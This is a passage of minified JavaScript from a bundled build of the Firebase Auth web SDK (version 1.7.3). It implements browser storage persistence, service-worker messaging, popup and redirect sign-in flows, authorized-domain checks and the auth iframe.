  stopPolling() {
    this.pollTimer && (clearInterval(this.pollTimer), (this.pollTimer = null));
  }
  attachListener() {
    window.addEventListener("storage", this.boundEventHandler);
  }
  detachListener() {
    window.removeEventListener("storage", this.boundEventHandler);
  }
  _addListener(e, t) {
    0 === Object.keys(this.listeners).length &&
      (this.fallbackToPolling ? this.startPolling() : this.attachListener()),
      this.listeners[e] ||
        ((this.listeners[e] = new Set()),
        (this.localCache[e] = this.storage.getItem(e))),
      this.listeners[e].add(t);
  }
  _removeListener(e, t) {
    this.listeners[e] &&
      (this.listeners[e].delete(t),
      0 === this.listeners[e].size && delete this.listeners[e]),
      0 === Object.keys(this.listeners).length &&
        (this.detachListener(), this.stopPolling());
  }
  async _set(e, t) {
    await super._set(e, t), (this.localCache[e] = JSON.stringify(t));
  }
  async _get(e) {
    const t = await super._get(e);
    return (this.localCache[e] = JSON.stringify(t)), t;
  }
  async _remove(e) {
    await super._remove(e), delete this.localCache[e];
  }
}
fa.type = "LOCAL";
const fd = fa;
class pa extends da {
  constructor() {
    super(() => window.sessionStorage, "SESSION");
  }
  _addListener(e, t) {}
  _removeListener(e, t) {}
}
pa.type = "SESSION";
const ha = pa;
function pd(n) {
  return Promise.all(
    n.map(async (e) => {
      try {
        return { fulfilled: !0, value: await e };
      } catch (t) {
        return { fulfilled: !1, reason: t };
      }
    })
  );
}
class Mn {
  constructor(e) {
    (this.eventTarget = e),
      (this.handlersMap = {}),
      (this.boundEventHandler = this.handleEvent.bind(this));
  }
  static _getInstance(e) {
    const t = this.receivers.find((i) => i.isListeningto(e));
    if (t) return t;
    const r = new Mn(e);
    return this.receivers.push(r), r;
  }
  isListeningto(e) {
    return this.eventTarget === e;
  }
  async handleEvent(e) {
    const t = e,
      { eventId: r, eventType: i, data: o } = t.data,
      s = this.handlersMap[i];
    if (null == s || !s.size) return;
    t.ports[0].postMessage({ status: "ack", eventId: r, eventType: i });
    const a = Array.from(s).map(async (c) => c(t.origin, o)),
      l = await pd(a);
    t.ports[0].postMessage({
      status: "done",
      eventId: r,
      eventType: i,
      response: l,
    });
  }
  _subscribe(e, t) {
    0 === Object.keys(this.handlersMap).length &&
      this.eventTarget.addEventListener("message", this.boundEventHandler),
      this.handlersMap[e] || (this.handlersMap[e] = new Set()),
      this.handlersMap[e].add(t);
  }
  _unsubscribe(e, t) {
    this.handlersMap[e] && t && this.handlersMap[e].delete(t),
      (!t || 0 === this.handlersMap[e].size) && delete this.handlersMap[e],
      0 === Object.keys(this.handlersMap).length &&
        this.eventTarget.removeEventListener("message", this.boundEventHandler);
  }
}
function Ar(n = "", e = 10) {
  let t = "";
  for (let r = 0; r < e; r++) t += Math.floor(10 * Math.random());
  return n + t;
}
Mn.receivers = [];
class hd {
  constructor(e) {
    (this.target = e), (this.handlers = new Set());
  }
  removeMessageHandler(e) {
    e.messageChannel &&
      (e.messageChannel.port1.removeEventListener("message", e.onMessage),
      e.messageChannel.port1.close()),
      this.handlers.delete(e);
  }
  async _send(e, t, r = 50) {
    const i = typeof MessageChannel < "u" ? new MessageChannel() : null;
    if (!i) throw new Error("connection_unavailable");
    let o, s;
    return new Promise((a, l) => {
      const c = Ar("", 20);
      i.port1.start();
      const d = setTimeout(() => {
        l(new Error("unsupported_event"));
      }, r);
      (s = {
        messageChannel: i,
        onMessage(u) {
          const f = u;
          if (f.data.eventId === c)
            switch (f.data.status) {
              case "ack":
                clearTimeout(d),
                  (o = setTimeout(() => {
                    l(new Error("timeout"));
                  }, 3e3));
                break;
              case "done":
                clearTimeout(o), a(f.data.response);
                break;
              default:
                clearTimeout(d),
                  clearTimeout(o),
                  l(new Error("invalid_response"));
            }
        },
      }),
        this.handlers.add(s),
        i.port1.addEventListener("message", s.onMessage),
        this.target.postMessage({ eventType: e, eventId: c, data: t }, [
          i.port2,
        ]);
    }).finally(() => {
      s && this.removeMessageHandler(s);
    });
  }
}
function Fe() {
  return window;
}
function md(n) {
  Fe().location.href = n;
}
function ma() {
  return (
    typeof Fe().WorkerGlobalScope < "u" &&
    "function" == typeof Fe().importScripts
  );
}
async function gd() {
  if (null == navigator || !navigator.serviceWorker) return null;
  try {
    return (await navigator.serviceWorker.ready).active;
  } catch {
    return null;
  }
}
function bd() {
  var n;
  return (
    (null === (n = null == navigator ? void 0 : navigator.serviceWorker) ||
    void 0 === n
      ? void 0
      : n.controller) || null
  );
}
function wd() {
  return ma() ? self : null;
}
const ga = "firebaseLocalStorageDb",
  _d = 1,
  Tn = "firebaseLocalStorage",
  ba = "fbase_key";
class rn {
  constructor(e) {
    this.request = e;
  }
  toPromise() {
    return new Promise((e, t) => {
      this.request.addEventListener("success", () => {
        e(this.request.result);
      }),
        this.request.addEventListener("error", () => {
          t(this.request.error);
        });
    });
  }
}
function Dn(n, e) {
  return n.transaction([Tn], e ? "readwrite" : "readonly").objectStore(Tn);
}
function yd() {
  const n = indexedDB.deleteDatabase(ga);
  return new rn(n).toPromise();
}
function dr() {
  const n = indexedDB.open(ga, 1);
  return new Promise((e, t) => {
    n.addEventListener("error", () => {
      t(n.error);
    }),
      n.addEventListener("upgradeneeded", () => {
        const r = n.result;
        try {
          r.createObjectStore(Tn, { keyPath: ba });
        } catch (i) {
          t(i);
        }
      }),
      n.addEventListener("success", async () => {
        const r = n.result;
        r.objectStoreNames.contains(Tn)
          ? e(r)
          : (r.close(), await yd(), e(await dr()));
      });
  });
}
async function wi(n, e, t) {
  const r = Dn(n, !0).put({ [ba]: e, value: t });
  return new rn(r).toPromise();
}
async function vd(n, e) {
  const t = Dn(n, !1).get(e),
    r = await new rn(t).toPromise();
  return void 0 === r ? null : r.value;
}
function _i(n, e) {
  const t = Dn(n, !0).delete(e);
  return new rn(t).toPromise();
}
const kd = 800,
  Id = 3;
class wa {
  constructor() {
    (this.type = "LOCAL"),
      (this._shouldAllowMigration = !0),
      (this.listeners = {}),
      (this.localCache = {}),
      (this.pollTimer = null),
      (this.pendingWrites = 0),
      (this.receiver = null),
      (this.sender = null),
      (this.serviceWorkerReceiverAvailable = !1),
      (this.activeServiceWorker = null),
      (this._workerInitializationPromise =
        this.initializeServiceWorkerMessaging().then(
          () => {},
          () => {}
        ));
  }
  async _openDb() {
    return this.db || (this.db = await dr()), this.db;
  }
  async _withRetries(e) {
    let t = 0;
    for (;;)
      try {
        const r = await this._openDb();
        return await e(r);
      } catch (r) {
        if (t++ > 3) throw r;
        this.db && (this.db.close(), (this.db = void 0));
      }
  }
  async initializeServiceWorkerMessaging() {
    return ma() ? this.initializeReceiver() : this.initializeSender();
  }
  async initializeReceiver() {
    (this.receiver = Mn._getInstance(wd())),
      this.receiver._subscribe("keyChanged", async (e, t) => ({
        keyProcessed: (await this._poll()).includes(t.key),
      })),
      this.receiver._subscribe("ping", async (e, t) => ["keyChanged"]);
  }
  async initializeSender() {
    var e, t;
    if (((this.activeServiceWorker = await gd()), !this.activeServiceWorker))
      return;
    this.sender = new hd(this.activeServiceWorker);
    const r = await this.sender._send("ping", {}, 800);
    !r ||
      ((null === (e = r[0]) || void 0 === e ? void 0 : e.fulfilled) &&
        (null === (t = r[0]) || void 0 === t
          ? void 0
          : t.value.includes("keyChanged")) &&
        (this.serviceWorkerReceiverAvailable = !0));
  }
  async notifyServiceWorker(e) {
    if (
      this.sender &&
      this.activeServiceWorker &&
      bd() === this.activeServiceWorker
    )
      try {
        await this.sender._send(
          "keyChanged",
          { key: e },
          this.serviceWorkerReceiverAvailable ? 800 : 50
        );
      } catch {}
  }
  async _isAvailable() {
    try {
      if (!indexedDB) return !1;
      const e = await dr();
      return await wi(e, En, "1"), await _i(e, En), !0;
    } catch {}
    return !1;
  }
  async _withPendingWrite(e) {
    this.pendingWrites++;
    try {
      await e();
    } finally {
      this.pendingWrites--;
    }
  }
  async _set(e, t) {
    return this._withPendingWrite(
      async () => (
        await this._withRetries((r) => wi(r, e, t)),
        (this.localCache[e] = t),
        this.notifyServiceWorker(e)
      )
    );
  }
  async _get(e) {
    const t = await this._withRetries((r) => vd(r, e));
    return (this.localCache[e] = t), t;
  }
  async _remove(e) {
    return this._withPendingWrite(
      async () => (
        await this._withRetries((t) => _i(t, e)),
        delete this.localCache[e],
        this.notifyServiceWorker(e)
      )
    );
  }
  async _poll() {
    const e = await this._withRetries((i) => {
      const o = Dn(i, !1).getAll();
      return new rn(o).toPromise();
    });
    if (!e) return [];
    if (0 !== this.pendingWrites) return [];
    const t = [],
      r = new Set();
    if (0 !== e.length)
      for (const { fbase_key: i, value: o } of e)
        r.add(i),
          JSON.stringify(this.localCache[i]) !== JSON.stringify(o) &&
            (this.notifyListeners(i, o), t.push(i));
    for (const i of Object.keys(this.localCache))
      this.localCache[i] &&
        !r.has(i) &&
        (this.notifyListeners(i, null), t.push(i));
    return t;
  }
  notifyListeners(e, t) {
    this.localCache[e] = t;
    const r = this.listeners[e];
    if (r) for (const i of Array.from(r)) i(t);
  }
  startPolling() {
    this.stopPolling(),
      (this.pollTimer = setInterval(async () => this._poll(), kd));
  }
  stopPolling() {
    this.pollTimer && (clearInterval(this.pollTimer), (this.pollTimer = null));
  }
  _addListener(e, t) {
    0 === Object.keys(this.listeners).length && this.startPolling(),
      this.listeners[e] || ((this.listeners[e] = new Set()), this._get(e)),
      this.listeners[e].add(t);
  }
  _removeListener(e, t) {
    this.listeners[e] &&
      (this.listeners[e].delete(t),
      0 === this.listeners[e].size && delete this.listeners[e]),
      0 === Object.keys(this.listeners).length && this.stopPolling();
  }
}
wa.type = "LOCAL";
const Ed = wa;
function _a(n, e) {
  return e
    ? Ge(e)
    : (F(n._popupRedirectResolver, n, "argument-error"),
      n._popupRedirectResolver);
}
new nn(3e4, 6e4);
class Rr extends Sr {
  constructor(e) {
    super("custom", "custom"), (this.params = e);
  }
  _getIdTokenResponse(e) {
    return At(e, this._buildIdpRequest());
  }
  _linkToIdToken(e, t) {
    return At(e, this._buildIdpRequest(t));
  }
  _getReauthenticationResolver(e) {
    return At(e, this._buildIdpRequest());
  }
  _buildIdpRequest(e) {
    const t = {
      requestUri: this.params.requestUri,
      sessionId: this.params.sessionId,
      postBody: this.params.postBody,
      tenantId: this.params.tenantId,
      pendingToken: this.params.pendingToken,
      returnSecureToken: !0,
      returnIdpCredential: !0,
    };
    return e && (t.idToken = e), t;
  }
}
function Td(n) {
  return ua(n.auth, new Rr(n), n.bypassAuthState);
}
function Sd(n) {
  const { auth: e, user: t } = n;
  return F(t, e, "internal-error"), Qu(t, new Rr(n), n.bypassAuthState);
}
async function Cd(n) {
  const { auth: e, user: t } = n;
  return F(t, e, "internal-error"), Zu(t, new Rr(n), n.bypassAuthState);
}
class ya {
  constructor(e, t, r, i, o = !1) {
    (this.auth = e),
      (this.resolver = r),
      (this.user = i),
      (this.bypassAuthState = o),
      (this.pendingPromise = null),
      (this.eventManager = null),
      (this.filter = Array.isArray(t) ? t : [t]);
  }
  execute() {
    return new Promise(async (e, t) => {
      this.pendingPromise = { resolve: e, reject: t };
      try {
        (this.eventManager = await this.resolver._initialize(this.auth)),
          await this.onExecution(),
          this.eventManager.registerConsumer(this);
      } catch (r) {
        this.reject(r);
      }
    });
  }
  async onAuthEvent(e) {
    const {
      urlResponse: t,
      sessionId: r,
      postBody: i,
      tenantId: o,
      error: s,
      type: a,
    } = e;
    if (s) return void this.reject(s);
    const l = {
      auth: this.auth,
      requestUri: t,
      sessionId: r,
      tenantId: o || void 0,
      postBody: i || void 0,
      user: this.user,
      bypassAuthState: this.bypassAuthState,
    };
    try {
      this.resolve(await this.getIdpTask(a)(l));
    } catch (c) {
      this.reject(c);
    }
  }
  onError(e) {
    this.reject(e);
  }
  getIdpTask(e) {
    switch (e) {
      case "signInViaPopup":
      case "signInViaRedirect":
        return Td;
      case "linkViaPopup":
      case "linkViaRedirect":
        return Cd;
      case "reauthViaPopup":
      case "reauthViaRedirect":
        return Sd;
      default:
        Pe(this.auth, "internal-error");
    }
  }
  resolve(e) {
    Ye(this.pendingPromise, "Pending promise was never set"),
      this.pendingPromise.resolve(e),
      this.unregisterAndCleanUp();
  }
  reject(e) {
    Ye(this.pendingPromise, "Pending promise was never set"),
      this.pendingPromise.reject(e),
      this.unregisterAndCleanUp();
  }
  unregisterAndCleanUp() {
    this.eventManager && this.eventManager.unregisterConsumer(this),
      (this.pendingPromise = null),
      this.cleanUp();
  }
}
const Ad = new nn(2e3, 1e4);
async function va(n, e, t) {
  if (De(n.app))
    return Promise.reject(Oe(n, "operation-not-supported-in-this-environment"));
  const r = _t(n);
  ou(n, e, Cr);
  const i = _a(r, t);
  return new ut(r, "signInViaPopup", e, i).executeNotNull();
}
class ut extends ya {
  constructor(e, t, r, i, o) {
    super(e, t, i, o),
      (this.provider = r),
      (this.authWindow = null),
      (this.pollId = null),
      ut.currentPopupAction && ut.currentPopupAction.cancel(),
      (ut.currentPopupAction = this);
  }
  async executeNotNull() {
    const e = await this.execute();
    return F(e, this.auth, "internal-error"), e;
  }
  async onExecution() {
    Ye(1 === this.filter.length, "Popup operations only handle one event");
    const e = Ar();
    (this.authWindow = await this.resolver._openPopup(
      this.auth,
      this.provider,
      this.filter[0],
      e
    )),
      (this.authWindow.associatedEvent = e),
      this.resolver._originValidation(this.auth).catch((t) => {
        this.reject(t);
      }),
      this.resolver._isIframeWebStorageSupported(this.auth, (t) => {
        t || this.reject(Oe(this.auth, "web-storage-unsupported"));
      }),
      this.pollUserCancellation();
  }
  get eventId() {
    var e;
    return (
      (null === (e = this.authWindow) || void 0 === e
        ? void 0
        : e.associatedEvent) || null
    );
  }
  cancel() {
    this.reject(Oe(this.auth, "cancelled-popup-request"));
  }
  cleanUp() {
    this.authWindow && this.authWindow.close(),
      this.pollId && window.clearTimeout(this.pollId),
      (this.authWindow = null),
      (this.pollId = null),
      (ut.currentPopupAction = null);
  }
  pollUserCancellation() {
    const e = () => {
      var t, r;
      null !==
        (r =
          null === (t = this.authWindow) || void 0 === t ? void 0 : t.window) &&
      void 0 !== r &&
      r.closed
        ? (this.pollId = window.setTimeout(() => {
            (this.pollId = null),
              this.reject(Oe(this.auth, "popup-closed-by-user"));
          }, 8e3))
        : (this.pollId = window.setTimeout(e, Ad.get()));
    };
    e();
  }
}
ut.currentPopupAction = null;
const Rd = "pendingRedirect",
  mn = new Map();
class Pd extends ya {
  constructor(e, t, r = !1) {
    super(
      e,
      ["signInViaRedirect", "linkViaRedirect", "reauthViaRedirect", "unknown"],
      t,
      void 0,
      r
    ),
      (this.eventId = null);
  }
  async execute() {
    let e = mn.get(this.auth._key());
    if (!e) {
      try {
        const r = (await xd(this.resolver, this.auth))
          ? await super.execute()
          : null;
        e = () => Promise.resolve(r);
      } catch (t) {
        e = () => Promise.reject(t);
      }
      mn.set(this.auth._key(), e);
    }
    return (
      this.bypassAuthState ||
        mn.set(this.auth._key(), () => Promise.resolve(null)),
      e()
    );
  }
  async onAuthEvent(e) {
    if ("signInViaRedirect" === e.type) return super.onAuthEvent(e);
    if ("unknown" !== e.type) {
      if (e.eventId) {
        const t = await this.auth._redirectUserForId(e.eventId);
        if (t) return (this.user = t), super.onAuthEvent(e);
        this.resolve(null);
      }
    } else this.resolve(null);
  }
  async onExecution() {}
  cleanUp() {}
}
async function xd(n, e) {
  const t = Nd(e),
    r = Ld(n);
  if (!(await r._isAvailable())) return !1;
  const i = "true" === (await r._get(t));
  return await r._remove(t), i;
}
function Od(n, e) {
  mn.set(n._key(), e);
}
function Ld(n) {
  return Ge(n._redirectPersistence);
}
function Nd(n) {
  return hn(Rd, n.config.apiKey, n.name);
}
async function Md(n, e, t = !1) {
  if (De(n.app)) return Promise.reject(ot(n));
  const r = _t(n),
    i = _a(r, e),
    s = await new Pd(r, i, t).execute();
  return (
    s &&
      !t &&
      (delete s.user._redirectEventId,
      await r._persistUserIfCurrent(s.user),
      await r._setRedirectUser(null, e)),
    s
  );
}
const Dd = 6e5;
class Ud {
  constructor(e) {
    (this.auth = e),
      (this.cachedEventUids = new Set()),
      (this.consumers = new Set()),
      (this.queuedRedirectEvent = null),
      (this.hasHandledPotentialRedirect = !1),
      (this.lastProcessedEventTime = Date.now());
  }
  registerConsumer(e) {
    this.consumers.add(e),
      this.queuedRedirectEvent &&
        this.isEventForConsumer(this.queuedRedirectEvent, e) &&
        (this.sendToConsumer(this.queuedRedirectEvent, e),
        this.saveEventToCache(this.queuedRedirectEvent),
        (this.queuedRedirectEvent = null));
  }
  unregisterConsumer(e) {
    this.consumers.delete(e);
  }
  onEvent(e) {
    if (this.hasEventBeenHandled(e)) return !1;
    let t = !1;
    return (
      this.consumers.forEach((r) => {
        this.isEventForConsumer(e, r) &&
          ((t = !0), this.sendToConsumer(e, r), this.saveEventToCache(e));
      }),
      this.hasHandledPotentialRedirect ||
        !Fd(e) ||
        ((this.hasHandledPotentialRedirect = !0),
        t || ((this.queuedRedirectEvent = e), (t = !0))),
      t
    );
  }
  sendToConsumer(e, t) {
    var r;
    if (e.error && !ka(e)) {
      const i =
        (null === (r = e.error.code) || void 0 === r
          ? void 0
          : r.split("auth/")[1]) || "internal-error";
      t.onError(Oe(this.auth, i));
    } else t.onAuthEvent(e);
  }
  isEventForConsumer(e, t) {
    const r = null === t.eventId || (!!e.eventId && e.eventId === t.eventId);
    return t.filter.includes(e.type) && r;
  }
  hasEventBeenHandled(e) {
    return (
      Date.now() - this.lastProcessedEventTime >= Dd &&
        this.cachedEventUids.clear(),
      this.cachedEventUids.has(yi(e))
    );
  }
  saveEventToCache(e) {
    this.cachedEventUids.add(yi(e)), (this.lastProcessedEventTime = Date.now());
  }
}
function yi(n) {
  return [n.type, n.eventId, n.sessionId, n.tenantId]
    .filter((e) => e)
    .join("-");
}
function ka({ type: n, error: e }) {
  return (
    "unknown" === n && "auth/no-auth-event" === (null == e ? void 0 : e.code)
  );
}
function Fd(n) {
  switch (n.type) {
    case "signInViaRedirect":
    case "linkViaRedirect":
    case "reauthViaRedirect":
      return !0;
    case "unknown":
      return ka(n);
    default:
      return !1;
  }
}
async function Hd(n, e = {}) {
  return Xe(n, "GET", "/v1/projects", e);
}
const jd = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,
  zd = /^https?/;
async function Bd(n) {
  if (n.config.emulator) return;
  const { authorizedDomains: e } = await Hd(n);
  for (const t of e)
    try {
      if (Vd(t)) return;
    } catch {}
  Pe(n, "unauthorized-domain");
}
function Vd(n) {
  const e = vn(),
    { protocol: t, hostname: r } = new URL(e);
  if (n.startsWith("chrome-extension://")) {
    const s = new URL(n);
    return "" === s.hostname && "" === r
      ? "chrome-extension:" === t &&
          n.replace("chrome-extension://", "") ===
            e.replace("chrome-extension://", "")
      : "chrome-extension:" === t && s.hostname === r;
  }
  if (!zd.test(t)) return !1;
  if (jd.test(n)) return r === n;
  const i = n.replace(/\./g, "\\.");
  return new RegExp("^(.+\\." + i + "|" + i + ")$", "i").test(r);
}
const $d = new nn(3e4, 6e4);
function vi() {
  const n = Fe().___jsl;
  if (null != n && n.H)
    for (const e of Object.keys(n.H))
      if (
        ((n.H[e].r = n.H[e].r || []),
        (n.H[e].L = n.H[e].L || []),
        (n.H[e].r = [...n.H[e].L]),
        n.CP)
      )
        for (let t = 0; t < n.CP.length; t++) n.CP[t] = null;
}
function qd(n) {
  return new Promise((e, t) => {
    var r, i, o;
    function s() {
      vi(),
        gapi.load("gapi.iframes", {
          callback: () => {
            e(gapi.iframes.getContext());
          },
          ontimeout: () => {
            vi(), t(Oe(n, "network-request-failed"));
          },
          timeout: $d.get(),
        });
    }
    if (
      null !==
        (i = null === (r = Fe().gapi) || void 0 === r ? void 0 : r.iframes) &&
      void 0 !== i &&
      i.Iframe
    )
      e(gapi.iframes.getContext());
    else {
      if (null === (o = Fe().gapi) || void 0 === o || !o.load) {
        const a = Nu("iframefcb");
        return (
          (Fe()[a] = () => {
            gapi.load ? s() : t(Oe(n, "network-request-failed"));
          }),
          aa(`${Lu()}?onload=${a}`).catch((l) => t(l))
        );
      }
      s();
    }
  }).catch((e) => {
    throw ((gn = null), e);
  });
}
let gn = null;
function Wd(n) {
  return (gn = gn || qd(n)), gn;
}
const Gd = new nn(5e3, 15e3),
  Kd = "__/auth/iframe",
  Yd = "emulator/auth/iframe",
  Jd = {
    style: { position: "absolute", top: "-100px", width: "1px", height: "1px" },
    "aria-hidden": "true",
    tabindex: "-1",
  },
  Xd = new Map([
    ["identitytoolkit.googleapis.com", "p"],
    ["staging-identitytoolkit.sandbox.googleapis.com", "s"],
    ["test-identitytoolkit.sandbox.googleapis.com", "t"],
  ]);
function Zd(n) {
  const e = n.config;
  F(e.authDomain, n, "auth-domain-config-required");
  const t = e.emulator ? Ir(e, Yd) : `https://${n.config.authDomain}/${Kd}`,
    r = { apiKey: e.apiKey, appName: n.name, v: tn },
    i = Xd.get(n.config.apiHost);
  i && (r.eid = i);
  const o = n._getFrameworks();
  return o.length && (r.fw = o.join(",")), `${t}?${en(r).slice(1)}`;
}
async function Qd(n) {
  const e = await Wd(n),
    t = Fe().gapi;
  return (
    F(t, n, "internal-error"),
    e.open(
      {
        where: document.body,
        url: Zd(n),
        messageHandlersFilter: t.iframes.CROSS_ORIGIN_IFRAMES_FILTER,
        attributes: Jd,
        dontclear: !0,
      },
      (r) =>
        new Promise(async (i, o) => {
          await r.restyle({ setHideOnLeave: !1 });
          const s = Oe(n, "network-request-failed"),
            a = Fe().setTimeout(() => {
              o(s);
            }, Gd.get());
          function l() {
            Fe().clearTimeout(a), i(r);
          }
          r.ping(l).then(l, () => {
            o(s);
          });
        })
    )
  );
}
const ef = {
    location: "yes",
    resizable: "yes",
    statusbar: "yes",
    toolbar: "no",
  },
  tf = 500,
  nf = 600,
  rf = "_blank",
  of = "http://localhost";
class ki {
  constructor(e) {
    (this.window = e), (this.associatedEvent = null);
  }
  close() {
    if (this.window)
      try {
        this.window.close();
      } catch {}
  }
}
function sf(n, e, t, r = tf, i = nf) {
  const o = Math.max((window.screen.availHeight - i) / 2, 0).toString(),
    s = Math.max((window.screen.availWidth - r) / 2, 0).toString();
  let a = "";
  const l = Object.assign(Object.assign({}, ef), {
      width: r.toString(),
      height: i.toString(),
      top: o,
      left: s,
    }),
    c = ve().toLowerCase();
  t && (a = ea(c) ? rf : t), Qs(c) && ((e = e || of), (l.scrollbars = "yes"));
  const d = Object.entries(l).reduce((f, [m, y]) => `${f}${m}=${y},`, "");
  if (Iu(c) && "_self" !== a) return af(e || "", a), new ki(null);
  const u = window.open(e || "", a, d);
  F(u, n, "popup-blocked");
  try {
    u.focus();
  } catch {}
  return new ki(u);
}
function af(n, e) {
  const t = document.createElement("a");
  (t.href = n), (t.target = e);
  const r = document.createEvent("MouseEvent");
  r.initMouseEvent(
    "click",
    !0,
    !0,
    window,
    1,
    0,
    0,
    0,
    0,
    !1,
    !1,
    !1,
    !1,
    1,
    null
  ),
    t.dispatchEvent(r);
}
const lf = "__/auth/handler",
  cf = "emulator/auth/handler",
  uf = encodeURIComponent("fac");
async function Ii(n, e, t, r, i, o) {
  F(n.config.authDomain, n, "auth-domain-config-required"),
    F(n.config.apiKey, n, "invalid-api-key");
  const s = {
    apiKey: n.config.apiKey,
    appName: n.name,
    authType: t,
    redirectUrl: r,
    v: tn,
    eventId: i,
  };
  if (e instanceof Cr) {
    e.setDefaultLanguage(n.languageCode),
      (s.providerId = e.providerId || ""),
      zl(e.getCustomParameters()) ||
        (s.customParameters = JSON.stringify(e.getCustomParameters()));
    for (const [d, u] of Object.entries(o || {})) s[d] = u;
  }
  if (e instanceof Dt) {
    const d = e.getScopes().filter((u) => "" !== u);
    d.length > 0 && (s.scopes = d.join(","));
  }
  n.tenantId && (s.tid = n.tenantId);
  const a = s;
  for (const d of Object.keys(a)) void 0 === a[d] && delete a[d];
  const l = await n._getAppCheckToken(),
    c = l ? `#${uf}=${encodeURIComponent(l)}` : "";
  return `${df(n)}?${en(a).slice(1)}${c}`;
}
function df({ config: n }) {
  return n.emulator ? Ir(n, cf) : `https://${n.authDomain}/${lf}`;
}
const Kn = "webStorageSupport";
class ff {
  constructor() {
    (this.eventManagers = {}),
      (this.iframes = {}),
      (this.originValidationPromises = {}),
      (this._redirectPersistence = ha),
      (this._completeRedirectFn = Md),
      (this._overrideRedirectResult = Od);
  }
  async _openPopup(e, t, r, i) {
    var o;
    Ye(
      null === (o = this.eventManagers[e._key()]) || void 0 === o
        ? void 0
        : o.manager,
      "_initialize() not called before _openPopup()"
    );
    return sf(e, await Ii(e, t, r, vn(), i), Ar());
  }
  async _openRedirect(e, t, r, i) {
    await this._originValidation(e);
    return md(await Ii(e, t, r, vn(), i)), new Promise(() => {});
  }
  _initialize(e) {
    const t = e._key();
    if (this.eventManagers[t]) {
      const { manager: i, promise: o } = this.eventManagers[t];
      return i
        ? Promise.resolve(i)
        : (Ye(o, "If manager is not set, promise should be"), o);
    }
    const r = this.initAndGetManager(e);
    return (
      (this.eventManagers[t] = { promise: r }),
      r.catch(() => {
        delete this.eventManagers[t];
      }),
      r
    );
  }
  async initAndGetManager(e) {
    const t = await Qd(e),
      r = new Ud(e);
    return (
      t.register(
        "authEvent",
        (i) => (
          F(null == i ? void 0 : i.authEvent, e, "invalid-auth-event"),
          { status: r.onEvent(i.authEvent) ? "ACK" : "ERROR" }
        ),
        gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER
      ),
      (this.eventManagers[e._key()] = { manager: r }),
      (this.iframes[e._key()] = t),
      r
    );
  }
  _isIframeWebStorageSupported(e, t) {
    this.iframes[e._key()].send(
      Kn,
      { type: Kn },
      (i) => {
        var o;
        const s =
          null === (o = null == i ? void 0 : i[0]) || void 0 === o
            ? void 0
            : o[Kn];
        void 0 !== s && t(!!s), Pe(e, "internal-error");
      },
      gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER
    );
  }
  _originValidation(e) {
    const t = e._key();
    return (
      this.originValidationPromises[t] ||
        (this.originValidationPromises[t] = Bd(e)),
      this.originValidationPromises[t]
    );
  }
  get _shouldInitProactively() {
    return oa() || Tr() || On();
  }
}
const pf = ff;
var Ei = "@firebase/auth",
  Ti = "1.7.3";
class hf {
  constructor(e) {
    (this.auth = e), (this.internalListeners = new Map());
  }
  getUid() {
    var e;
    return (
      this.assertAuthConfigured(),
      (null === (e = this.auth.currentUser) || void 0 === e ? void 0 : e.uid) ||
        null
    );
  }
  async getToken(e) {
    return (
      this.assertAuthConfigured(),
      await this.auth._initializationPromise,
      this.auth.currentUser
        ? { accessToken: await this.auth.currentUser.getIdToken(e) }
        : null
    );
  }
  addAuthTokenListener(e) {
    if ((this.assertAuthConfigured(), this.internalListeners.has(e))) return;
    const t = this.auth.onIdTokenChanged((r) => {
      e((null == r ? void 0 : r.stsTokenManager.accessToken) || null);
    });
    this.internalListeners.set(e, t), this.updateProactiveRefresh();
  }
  removeAuthTokenListener(e) {
    this.assertAuthConfigured();
    const t = this.internalListeners.get(e);
    !t ||
      (this.internalListeners.delete(e), t(), this.updateProactiveRefresh());
  }
  assertAuthConfigured() {
    F(
      this.auth._initializationPromise,
      "dependent-sdk-initialized-before-auth"
    );
  }
  updateProactiveRefresh() {
    this.internalListeners.size > 0
      ? this.auth._startProactiveRefresh()
      : this.auth._stopProactiveRefresh();
  }
}
function mf(n) {
  switch (n) {
    case "Node":
      return "node";
    case "ReactNative":
      return "rn";
    case "Worker":
      return "webworker";
    case "Cordova":
      return "cordova";
    case "WebExtension":
      return "web-extension";
    default:
      return;
  }
}
function gf(n) {
  Ke(
    new He(
      "auth",
      (e, { options: t }) => {
        const r = e.getProvider("app").getImmediate(),
          i = e.getProvider("heartbeat"),
          o = e.getProvider("app-check-internal"),
          { apiKey: s, authDomain: a } = r.options;
        F(s && !s.includes(":"), "invalid-api-key", { appName: r.name });
        const l = {
            apiKey: s,
            authDomain: a,
            clientPlatform: n,
            apiHost: "identitytoolkit.googleapis.com",
            tokenApiHost: "securetoken.googleapis.com",
            apiScheme: "https",
            sdkClientVersion: sa(n),
          },
          c = new Pu(r, i, o, l);
        return Hu(c, t), c;
      },
      "PUBLIC"
    )
      .setInstantiationMode("EXPLICIT")
      .setInstanceCreatedCallback((e, t, r) => {
        e.getProvider("auth-internal").initialize();
      })
  ),
    Ke(
      new He(
        "auth-internal",
        (e) => {
          const t = _t(e.getProvider("auth").getImmediate());
          return new hf(t);
        },
        "PRIVATE"
      ).setInstantiationMode("EXPLICIT")
    ),
    Ue(Ei, Ti, mf(n)),
    Ue(Ei, Ti, "esm2017");
}
const bf = 300,
  wf = Ms("authIdTokenMaxAge") || bf;
let Si = null;
const _f = (n) => async (e) => {
  const t = e && (await e.getIdTokenResult()),
    r = t && (new Date().getTime() - Date.parse(t.issuedAtTime)) / 1e3;
  if (r && r > wf) return;
  const i = null == t ? void 0 : t.token;
  Si !== i &&
    ((Si = i),
    await fetch(n, {
      method: i ? "POST" : "DELETE",
      headers: i ? { Authorization: `Bearer ${i}` } : {},
    }));
};
function yf(n = qc()) {
  const e = Nt(n, "auth");
  if (e.isInitialized()) return e.getImmediate();
  const t = Fu(n, { popupRedirectResolver: pf, persistence: [Ed, fd, ha] }),
    r = Ms("authTokenSyncURL");
  if (r && "boolean" == typeof isSecureContext && isSecureContext) {
    const o = new URL(r, location.origin);
    if (location.origin === o.origin) {
      const s = _f(o.toString());
      sd(t, s, () => s(t.currentUser)), od(t, (a) => s(a));
    }
  }
  const i = Ls("auth");
  return i && ju(t, `http://${i}`), t;
}
function vf() {
  var n, e;
  return null !==
    (e =
      null === (n = document.getElementsByTagName("head")) || void 0 === n
        ? void 0
        : n[0]) && void 0 !== e
    ? e
    : document;
}
xu({
  loadJS: (n) =>
    new Promise((e, t) => {
      const r = document.createElement("script");
      r.setAttribute("src", n),
        (r.onload = e),
        (r.onerror = (i) => {
